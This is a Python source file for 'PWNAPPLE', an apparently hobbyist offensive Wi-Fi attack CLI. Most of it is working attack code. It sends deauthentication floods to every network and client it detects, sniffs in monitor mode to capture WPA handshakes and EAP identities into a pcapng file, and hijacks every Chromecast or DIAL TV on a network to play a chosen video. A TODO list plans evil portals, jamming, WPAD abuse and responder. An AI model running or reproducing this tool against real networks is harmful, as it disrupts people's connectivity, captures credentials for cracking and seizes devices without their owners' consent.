from scapy.all import *
from scapy.utils import PcapNgWriter
import threading
import os
from rich import print
import typer 
from typing import Annotated
import pychromecast
import zeroconf
import re
from pylaunch.dial import Dial
from pychromecast.controllers.youtube import YouTubeController
# You will have to redo the logic here, since you don't need to sniff all packets 24/7 in mointer mode. #


# parser = argparse.ArgumentParser(prog="PWNAPPLE",description="PWNAPPLE'S CLI for a variety of attacks, you need 2 adapters for this to work well")
# parser.add_argument("-t", "--timeout", help="The delay in seconds before switching channels",default=3,type=int)
# parser.add_argument("-o", "--output", help="The name of the file you want to output to", required=True,type=str)
# parser.add_argument("-i", "--interface", help="The interface you want to use", required=True) # Auto sets into mointer mode!
# parser.add_argument("-d", "--deauth", help="If passed the with a interface, it will deauth all networks (BE CAREFUL!)")
# Something to note, we should have a sniffer for traffic on the network pwnapple connects to.
# if the -s function is True, then we sniff EAPOL, but if it's false we should have it do it's other tasks
# this is pwnapple's cli, think of it as a starting point for all the functions pwnapple will eventually have on the webui
### REDOING WITH TYPER ###
app = typer.Typer()


# I know global vars are dumb, but it's quicker  #


ssids = []
bssids = []
macAddresses = []
totalSSIDS = []
totalBSSIDS = []
totalmacAddresses = []
def deauthNetworks():
    print("[bold red]Will start to deauth when targets availible[/bold red]")
    while True:
        try:
            for bssid, macAddress, ssid in zip(bssids, macAddresses, ssids):
                # https://stackoverflow.com/questions/65878127/why-is-my-scapy-deauth-function-not-working -- found this (Thank you!)
                dot11 = Dot11(addr1=macAddress,addr2=bssid,addr3=bssid)
                print(f"[bold red][Info]: Deauthing: {ssid}, BSSID: {bssid}, MAC: {macAddress} 10 times[/bold red]")
                frame = RadioTap()/dot11/Dot11Deauth()
                sendp(frame, inter=0.01, count=10, 
                    iface=interfaceDeauth, verbose=0)
                time.sleep(2)
        except Exception as err:
            print(err)
            

def cleanList():
    while True:
        time.sleep(30)
        print(f"[bold red][Info]: Clearing ssids, bssids, and macs from deauth targets[/bold red]")
        ssids.clear()
        bssids.clear()
        macAddresses.clear()

print(
    """[bold green]                                                        
██████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░██████╗░██████╗░██╗░░░░░███████╗
██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗██╔══██╗██╔══██╗██║░░░░░██╔════╝
██████╔╝░╚██╗████╗██╔╝██╔██╗██║███████║██████╔╝██████╔╝██║░░░░░█████╗░░
██╔═══╝░░░████╔═████║░██║╚████║██╔══██║██╔═══╝░██╔═══╝░██║░░░░░██╔══╝░░
██║░░░░░░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║██║░░░░░██║░░░░░███████╗███████╗
╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚══════╝ [bold red]by mater8600[/bold red]
[/bold green]
"""
)
    

def channelHop(interface,timeout):
    """Hops channels for capturing handshakes, or EAP identity"""
    while True:
        for channel in range(1, 12): 
            os.system("clear")
            print(f"[dim cyan][Info]: Currently on channel: {channel}[/dim cyan]")
            for ssid, bssid, mac in zip(totalSSIDS,totalBSSIDS, totalmacAddresses):
                print(f"[dim cyan][Info]: SSID: {ssid} BSSID: {bssid} MAC: {mac}[/dim cyan]")
            
            os.system(f"iw dev {interface} set channel {channel}")
           
            time.sleep(timeout)
def setupAdapter(interface):
    """Starts mointer mode for the specified interface"""
    print(f"Setting up {interface} if it isn't already.")
    try:
        os.system(f"airmon-ng start {interface}")
    except:
        print(Exception)
### This is NOT done, I just don't have my pi has a test board!
def changeHotspot(hotspotname, hotspotpassword):
    """Creates a wifi hotspot with the specified name, and password, this is to change the default hotspot"""
    if hotspotname !=None:
        # We should also clear the previous settings to ensure the hotspots don't conflict
        # 
        print("Creating hotspot!")
        os.system("nmcli ")
def createPortal():
    """creates a hotspot for the evil portal attacks, NOT IMPLEMENTED!"""
def sniffEapol(interface,deauth,output,timeout,logAll):
    threading.Thread(target=channelHop,args=(interface,timeout,)).start()
    #setupAdapter(interface=interface) ## removed for simplicity rn 
    
    if deauth == True:
        threading.Thread(target=deauthNetworks).start()
        threading.Thread(target=cleanList).start()
    dump = PcapNgWriter(f"{output}.pcapng") 
    def PacketHandler(pkt):
        """Handles all the packet functions for the sniffer"""
        if logAll == True:
            dump.write(pkt)
        else:   
            if pkt.haslayer(Dot11): 
                if pkt.type == 0 and pkt.subtype == 8:
                    if pkt.addr2 not in bssids:
                        ssids.append(pkt.info)
                        bssids.append(pkt.addr2)
                        macAddresses.append(pkt.addr3)
                        if pkt.addr2 not in totalBSSIDS:
                            print(f"[dim cyan][Info]: Beacon frame found: SSID: {pkt.info}, BSSID: {pkt.addr2}, MAC: {pkt.addr3}[/dim cyan]")
                            totalSSIDS.append(pkt.info)
                            totalBSSIDS.append(pkt.addr2)
                            totalmacAddresses.append(pkt.addr3)
                        
                    dump.write(pkt)
                    if pkt.haslayer(EAP) and pkt.code == 2 and pkt.type == 1:
                        identity = pkt.identity.decode(errors="ignore")
                        print(f"[bold green][Info]: EAP Identity Found: {identity}[/bold green]")
                        dump.write(pkt)

                if pkt.haslayer(EAPOL):
                    print(f"[bold green][Info]: Handshake captured: {pkt.summary()}[/bold green]")
                    dump.write(pkt)
                if pkt.haslayer(Dot11ProbeReq):
                    ssid = pkt.getlayer(Dot11Elt).info.decode() if pkt.getlayer(Dot11Elt) else "Hidden/Broadcast"
                    if ssid == "":
                        ssid = "Unknown"
                    print(f"[bold green][Info]: Probe Request from MAC: {pkt.addr2}, SSID: {ssid}[/bold green]")
                
            
    sniff(iface=interface,prn=PacketHandler,store=False,monitor=True)

# Typer commands 
### 
@app.command(help="Sniff in mointer mode")
def sniffEAPOL(
    interface: str,
    timeout: Annotated[int,typer.Option(help="The time between the channel hops")] =5,
    logall: Annotated[bool,typer.Option(help="Log all packets instead of just EAPOL!")] =False,
    output: Annotated[str,typer.Option(help="file to output to. (No need for filename!) default =output")] = "output",
    deauth: Annotated[bool,typer.Option(help="pass if need autodeauth")]= False,
            ):
    sniffEapol(interface,deauth,output,timeout,logall)
    #

@app.command(name="hijack")
def hijack(
    url: Annotated[str,typer.Argument(help="The url to broadcast default is rickroll")] = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
):
     
     """Hijack all chromecasts on a network and DIAL TVS and play a video of your choice"""
     print(f"[dim cyan][Info]: Hjacking all the chromecasts with the url: {url}[/dim cyan]")
     d = Dial.discover()
     videoID = url.strip("https://www.youtube.com/watch?v=")
     for device in d:
        try:
            device.launch_app('YouTube', v=videoID)
        except Exception as error:
            print(error)
    
     zconf = zeroconf.Zeroconf()
     browser = pychromecast.CastBrowser(listener, zconf)
     browser.start_discovery()
     time.sleep(2)
     pychromecast.discovery.stop_discovery(browser)

     for uuid, info in browser.devices.items():
            print(f"[dim cyan][info]: UUID: {uuid}, Friendly Name: {info.friendly_name}[/dim cyan]")
            chromecasts, browser2 = pychromecast.get_listed_chromecasts(uuids={uuid})
            if chromecasts:
                cast = chromecasts[0]
                cast.wait()
                yt = YouTubeController()
                cast.register_handler(yt)
                yt.play_video(video_id=videoID)
                browser2.stop_discovery()

        
app()
# TODO 
# ADD TYPER OR ARGSPARSE  done
# MAKE THIS A COMMAND, NOT JUST A FUNCTION done
# ARP SCANS --- NEXT 
# EVIL PORTAL -- when we get more adapters finish/work on
# DEAUTH mostly done, needs more work (channel hopping issues) (make interface hop channels)
# NRF24 allow for the attachment of NRF24 antenna's for jamming
# C1101 antenna 
# Chromecast/Dial hijack -- done!
# WPAD  abuse  -- evil portal first (inspired by: https://github.com/7h30th3r0n3/Evil-M5Project/wiki/wpad-abuse)
# Handshake Conversion
# responder 

